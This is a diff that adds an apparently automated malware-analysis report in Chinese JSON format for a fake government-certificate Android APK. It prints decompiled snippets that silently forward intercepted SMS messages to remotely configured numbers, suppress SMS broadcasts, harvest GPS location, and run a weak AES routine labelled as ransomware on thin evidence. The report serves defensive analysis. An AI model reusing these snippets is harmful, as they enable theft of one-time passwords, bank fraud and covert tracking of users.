@@ -1,0 +1,152 @@
+{
+  "APK信息": {
+    "文件名": "3d5e325b2c1cf78f8e1e14c0cd4d7008ac06c4dafc78f22e9b71b6a2f41e2a76.apk",
+    "sha256": "3d5e325b2c1cf78f8e1e14c0cd4d7008ac06c4dafc78f22e9b71b6a2f41e2a76",
+    "包名": "com.sms.MobileSMS",
+    "应用名": "高检院电子协办证",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 335.0
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sms\\MobileSMS\\SmsReceiver;",
+          "method_signature": "if(i4 >= jSONArrayB.length()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String displayMessageBody = smsMessage.getDisplayMessageBody();\nString string = ((JSONObject) jSONArrayB.get(i4)).getString(\"switch_mobile\");\nsmsManager.sendTextMessage(string, null, displayMessageBody, null, null);",
+          "malicious_code_snippet_context": "                  int i2 = (!intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") && intent.getAction().equals(\"android.provider.Telephony.SMS_SENT\")) ? 2 : 1;\n                  for (SmsMessage smsMessage : smsMessageArr) {\n                      String displayOriginatingAddress = smsMessage.getDisplayOriginatingAddress();\n>>>                     String displayMessageBody = smsMessage.getDisplayMessageBody();\n>>>                     Log.i(\"msg\", \"执行了...来源：\" + displayOriginatingAddress);\n>>>                     int i3 = 0;\n                      while (true) {\n                          int i4 = i3;\n                          if (i4 >= jSONArrayB.length()) {",
+          "behavior_description": "该代码位于SmsReceiver广播接收器中，监听设备收到的短信并提取短信内容(getDisplayMessageBody)和来源号码(getDisplayOriginatingAddress)，然后遍历远程下发的JSON配置数组，取出其中的'switch_mobile'转发号码，通过SmsManager.sendTextMessage将收到的短信内容静默转发（无任何用户界面和提示）到这些号码，实现短信拦截转发。数据流向：接收短信内容(source)→静默转发至攻击者配置的号码(sink)。此类行为常用于窃取短信验证码(OTP)实施银行欺诈，同时还会将SIM卡号、来源号码、转发目标及短信内容加密后(l.a)记录上报，属于典型的短信欺诈木马行为，直接造成用户短信隐私泄露和资费损失。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\sms\\MobileSMS\\DeliverSmsReceiver;",
+          "method_signature": "if(i >= smsMessageArr.length)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "abortBroadcast();\nsmsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);\nString originatingAddress2 = smsMessageArr[i2].getOriginatingAddress();\nString messageBody2 = smsMessageArr[i2].getMessageBody();\ncontentValues2.put(\"address\", originatingAddress2);\ncontentValues2.put(\"body\", messageBody2);\nthis.f185a.insert(Uri.parse(\"content://sms/inbox\"), contentValues2);",
+          "malicious_code_snippet_context": "                          i++;\n                      }\n                  } else {\n>>>                     abortBroadcast();\n>>>                     int i2 = 0;\n>>>                     String strA = \"\";\n>>>                     str = \"\";\n>>>                     while (i2 < smsMessageArr.length) {\n>>>                         smsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);\n>>>                         String originatingAddress2 = smsMessageArr[i2].getOriginatingAddress();\n                          String messageBody2 = smsMessageArr[i2].getMessageBody();\n                          ContentValues contentValues2 = new ContentValues();\n                          contentValues2.put(\"address\", originatingAddress2);",
+          "behavior_description": "该代码位于短信广播接收器 DeliverSmsReceiver 中，通过 SmsMessage.createFromPdu() 解析接收到的短信 PDU 数据，提取发件人号码和短信正文，随后调用 abortBroadcast() 终止短信广播的继续传播，阻止系统默认短信应用及其他应用收到该短信，实现短信拦截与隐藏；同时将拦截到的短信内容（发件人、时间、正文）写入 content://sms/inbox 收件箱，用于隐藏或伪造短信记录。数据流向：短信广播 PDU 数据 → getOriginatingAddress()/getMessageBody() 提取 → abortBroadcast() 拦截广播 + insert() 写入短信收件箱。该技术是典型的银行木马/短信欺诈手法，常用于拦截银行验证码（OTP）或隐藏扣费确认短信，直接导致用户资金损失和隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lb\\b;",
+          "method_signature": "if(this.f164a.isProviderEnabled(\"gps\")",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.f164a.isProviderEnabled(\"gps\")) {\n    Location lastKnownLocation = this.f164a.getLastKnownLocation(\"gps\");\n    if (lastKnownLocation != null) {\n        this.f165b = lastKnownLocation.getLatitude();\n        this.f166c = lastKnownLocation.getLongitude();\n    }\n} else {\n    this.f164a.requestLocationUpdates(\"network\", 1000L, 0.0f, new c(this));\n    Location lastKnownLocation2 = this.f164a.getLastKnownLocation(\"network\");\n    if (lastKnownLocation2 != null) {\n        this.f165b = lastKnownLocation2.getLatitude();\n        this.f166c = lastKnownLocation2.getLongitude();\n    }\n}",
+          "malicious_code_snippet_context": "          map.put(\"lat\", \"0.0\");\n          map.put(\"lng\", \"0.0\");\n          try {\n>>>             if (this.f164a.isProviderEnabled(\"gps\")) {\n>>>                 Location lastKnownLocation = this.f164a.getLastKnownLocation(\"gps\");\n>>>                 if (lastKnownLocation != null) {\n>>>                     this.f165b = lastKnownLocation.getLatitude();\n>>>                     this.f166c = lastKnownLocation.getLongitude();\n>>>                 }\n>>>             } else {\n>>>                 this.f164a.requestLocationUpdates(\"network\", 1000L, 0.0f, new c(this));\n>>>                 Location lastKnownLocation2 = this.f164a.getLastKnownLocation(\"network\");\n>>>                 if (lastKnownLocation2 != null) {\n>>>                     this.f165b = lastKnownLocation2.getLatitude();\n>>>                     this.f166c = lastKnownLocation2.getLongitude();\n>>>                 }\n>>>             }\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该代码在用户不知情的情况下静默窃取设备精确地理位置：通过 LocationManager 检查 GPS provider 是否启用，若启用则调用 getLastKnownLocation(\"gps\") 读取最近一次 GPS 定位；若 GPS 未启用，则降级注册 network provider 的位置更新监听（requestLocationUpdates）并读取网络定位结果。随后提取纬度/经度存入成员变量，并以 \"lat\"/\"lng\" 键值对打包进 HashMap 返回，供恶意程序后续将位置数据上传至远程服务器，实现对受害者位置的持续追踪。数据流向：LocationManager.getLastKnownLocation()/requestLocationUpdates()（GPS/网络定位数据源）→ 提取经纬度封装为 HashMap（位置隐私窃取，待外传）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lb\\a;",
+          "method_signature": "if(length2 > bArr.length)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\nbyte[] bArr = new byte[16];\nbyte[] bytes = str2.getBytes(\"UTF-8\");\nint length2 = bytes.length;\nif (length2 > bArr.length) { length2 = bArr.length; }\nSystem.arraycopy(bytes, 0, bArr, 0, length2);\ncipher.init(1, new SecretKeySpec(bArr, \"AES\"), new IvParameterSpec(bArr));\nbyte[] bArrDoFinal = cipher.doFinal(str.getBytes(\"UTF-8\"));\nreturn new String(Base64.encode(bArrDoFinal, 0, bArrDoFinal.length, 0), \"UTF-8\");",
+          "malicious_code_snippet_context": "              }\n          }\n          try {\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             byte[] bArr = new byte[16];\n>>>             byte[] bytes = str2.getBytes(\"UTF-8\");\n>>>             int length2 = bytes.length;\n>>>             if (length2 > bArr.length) {\n>>>                 length2 = bArr.length;\n>>>             }\n>>>             System.arraycopy(bytes, 0, bArr, 0, length2);\n>>>             cipher.init(1, new SecretKeySpec(bArr, \"AES\"), new IvParameterSpec(bArr));\n              byte[] bArrDoFinal = cipher.doFinal(str.getBytes(\"UTF-8\"));\n              return new String(Base64.encode(bArrDoFinal, 0, bArrDoFinal.length, 0), \"UTF-8\");\n          } catch (Exception e) {",
+          "behavior_description": "该代码位于混淆类Lb\\a;中，实现AES/CBC/PKCS5Padding对称加密核心函数：将密钥字符串str2的UTF-8字节截断至16字节作为AES密钥，并直接复用同一字节数组作为IV（密钥即IV的弱加密实现，常见于恶意样本）；随后以加密模式(cipher.init(1,...))对传入明文str执行cipher.doFinal()加密，密文经Base64编码后返回。数据流向为：待加密明文数据（方法参数str，勒索场景下为用户文件内容/敏感数据）→ AES/CBC加密（密钥来自参数str2）→ Base64编码密文输出。该类中还配套存在解密方法b()，构成完整加解密原语，在已确认的勒索软件样本中作为文件/数据加密的核心实现，直接导致用户数据无法访问，造成数据损失。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
